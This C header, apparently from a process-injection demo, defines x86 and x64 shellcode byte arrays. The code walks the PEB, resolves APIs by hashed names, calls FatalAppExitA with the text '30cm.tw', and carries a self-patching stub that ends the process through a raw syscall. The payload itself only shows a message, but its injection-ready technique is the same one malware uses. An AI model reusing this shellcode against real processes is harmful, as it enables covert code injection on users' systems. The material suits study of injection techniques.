#pragma once
#define x86_shellcode "\xe9\x1e\x01\x00\x00\x90\x66\x83\x39\x00\x74\x24\x53\x31\xc0\x8d\x59\x02\x0f\xb7\x0b\x83\xc3\x02\x89\xca\x83\xca\x20\x0f\xb7\xd2\x01\xd0\xc1\xc8\x08\x66\x85\xc9\x75\xe8\x5b\xc3\x8d\x74\x26\x00\x31\xc0\xc3\x80\x39\x00\x74\x28\x53\x31\xc0\x8d\x59\x01\x66\x90\x0f\xb6\x0b\x83\xc3\x01\x89\xca\x83\xca\x20\x0f\xbe\xd2\x01\xd0\xc1\xc8\x08\x84\xc9\x75\xe9\x5b\xc3\x8d\xb4\x26\x00\x00\x00\x00\x31\xc0\xc3\x57\x56\x53\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x58\x14\x8d\x70\x14\x39\xf3\x74\x27\x89\xcf\xeb\x09\x8d\x76\x00\x8b\x1b\x39\xf3\x74\x1a\x8b\x4b\x28\xe8\x78\xff\xff\xff\x39\xf8\x75\xee\x8b\x43\x10\x5b\x5e\x5f\xc3\x8d\xb4\x26\x00\x00\x00\x00\x5b\x31\xc0\x5e\x5f\xc3\x8b\x41\x3c\x8b\x44\x01\x78\x85\xc0\x74\x6f\x55\x01\xc8\x57\x56\x53\x83\xec\x08\x8b\x78\x18\x89\x44\x24\x04\x85\xff\x74\x28\x8b\x58\x20\x89\x14\x24\x89\xce\x31\xed\x01\xcb\x85\xdb\x74\x0e\x8b\x0b\x01\xf1\xe8\x55\xff\xff\xff\x3b\x04\x24\x74\x1d\x83\xc5\x01\x83\xc3\x04\x39\xef\x75\xe4\x83\xc4\x08\x31\xc0\x5b\x5e\x5f\x5d\xc3\x89\xf6\x8d\xbc\x27\x00\x00\x00\x00\x8b\x7c\x24\x04\x8d\x04\x6e\x03\x47\x24\x0f\xb7\x00\x8d\x04\x86\x03\x47\x1c\x03\x30\x83\xc4\x08\x5b\x89\xf0\x5e\x5f\x5d\xc3\x90\x31\xc0\xc3\x57\xb8\x41\x00\x00\x00\x56\x53\x83\xec\x30\x8d\x4c\x24\x22\xc7\x44\x24\x22\x46\x61\x74\x61\xc7\x44\x24\x26\x6c\x41\x70\x70\xc7\x44\x24\x2a\x45\x78\x69\x74\x66\x89\x44\x24\x2e\xe8\xdf\xfe\xff\xff\x89\xc7\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x58\x14\x8d\x70\x14\x39\xde\x75\x0d\xeb\x45\x90\x8d\x74\x26\x00\x8b\x1b\x39\xde\x74\x0e\x8b\x4b\x10\x89\xfa\xe8\x26\xff\xff\xff\x85\xc0\x74\xec\x8d\x54\x24\x1a\xc7\x44\x24\x1a\x33\x30\x63\x6d\xc7\x44\x24\x1e\x2e\x74\x77\x00\x89\x54\x24\x04\xc7\x04\x24\x00\x00\x00\x00\xff\xd0\x83\xec\x08\x83\xc4\x30\x5b\x5e\x5f\xc3\x90\x31\xc0\xeb\xd0";
#define x64_shellcode "\xe9\x2b\x01\x00\x00\x90\x4c\x8d\x41\x02\x31\xc0\x66\x83\x39\x00\x74\x1e\x41\x0f\xb7\x08\x49\x83\xc0\x02\x89\xca\x83\xca\x20\x0f\xb7\xd2\x01\xd0\xc1\xc8\x08\x66\x85\xc9\x75\xe6\xc3\x0f\x1f\x00\xc3\x4c\x8d\x41\x01\x31\xc0\x80\x39\x00\x74\x24\x0f\x1f\x40\x00\x41\x0f\xb6\x08\x49\x83\xc0\x01\x89\xca\x83\xca\x20\x0f\xbe\xd2\x01\xd0\xc1\xc8\x08\x84\xc9\x75\xe7\xc3\x66\x0f\x1f\x44\x00\x00\xc3\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x4c\x8b\x48\x20\x4c\x8d\x50\x20\x4d\x39\xd1\x74\x2f\x48\x83\xec\x28\x41\x89\xcb\xeb\x08\x4d\x8b\x09\x4d\x39\xd1\x74\x17\x49\x8b\x49\x50\xe8\x71\xff\xff\xff\x44\x39\xd8\x75\xea\x49\x8b\x41\x20\x48\x83\xc4\x28\xc3\x31\xc0\x48\x83\xc4\x28\xc3\x31\xc0\xc3\x57\x56\x53\x48\x83\xec\x20\x48\x63\x41\x3c\x8b\xb4\x01\x88\x00\x00\x00\x85\xf6\x74\x42\x48\x01\xce\x8b\x46\x18\x85\xc0\x74\x38\x44\x8b\x4e\x20\x89\xd7\x49\x89\xcb\x45\x31\xd2\x8d\x58\xff\x49\x01\xc9\xeb\x03\x4d\x89\xc2\x4d\x85\xc9\x74\x0f\x41\x8b\x09\x4c\x01\xd9\xe8\x3d\xff\xff\xff\x39\xf8\x74\x18\x4d\x8d\x42\x01\x49\x83\xc1\x04\x4c\x39\xd3\x75\xdc\x48\x83\xc4\x20\x31\xc0\x5b\x5e\x5f\xc3\x90\x8b\x46\x24\x4b\x8d\x14\x53\x0f\xb7\x14\x02\x8b\x46\x1c\x49\x8d\x14\x93\x8b\x04\x02\x48\x83\xc4\x20\x5b\x5e\x5f\x4c\x01\xd8\xc3\x48\xb8\x46\x61\x74\x61\x6c\x41\x70\x70\x57\x56\x53\x48\x83\xec\x40\x48\x89\x44\x24\x32\x48\x8d\x4c\x24\x32\xb8\x41\x00\x00\x00\xc7\x44\x24\x3a\x45\x78\x69\x74\x66\x89\x44\x24\x3e\xe8\xcf\xfe\xff\xff\x89\xc7\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x58\x20\x48\x8d\x70\x20\x48\x39\xde\x75\x0a\xeb\x40\x48\x8b\x1b\x48\x39\xde\x74\x10\x48\x8b\x4b\x20\x89\xfa\xe8\x1a\xff\xff\xff\x48\x85\xc0\x74\xe8\x48\xbf\x33\x30\x63\x6d\x2e\x74\x77\x00\x31\xc9\x48\x89\x7c\x24\x2a\x48\x8d\x54\x24\x2a\xff\xd0\x48\x83\xc4\x40\x5b\x5e\x5f\xc3\x0f\x1f\x84\x00\x00\x00\x00\x00\x31\xc0\xeb\xd4";

#define x96_runOnlyOnce /* call +5				 */ "\xe8\x00\x00\x00\x00"             \
						/* pop rax			  	 */  "\x58"				               \
						/* padding				 */ "\x90\x90\x90"		               \
						/* mov [rax-5], 00002CB8 */ "\x48\xC7\x40\xFB\xb8\x2c\x00\x00" \
						/* mov [rax-1], 2ECD00C3 */ "\x48\xC7\x40\xFF\x00\xCD\x2E\xCC"
						/* make a x86 Assembly Chain: 
						 * mov eax, 0x2c <ZwTerminateProcess>
						 * int 2E
						 * int 3
						 */

#ifdef _WIN64
char shellcode[] = x96_runOnlyOnce x64_shellcode;
size_t shellcodeLen = sizeof(shellcode);
#else
char shellcode[] = x96_runOnlyOnce x86_shellcode;
size_t shellcodeLen = sizeof(shellcode);
#endif
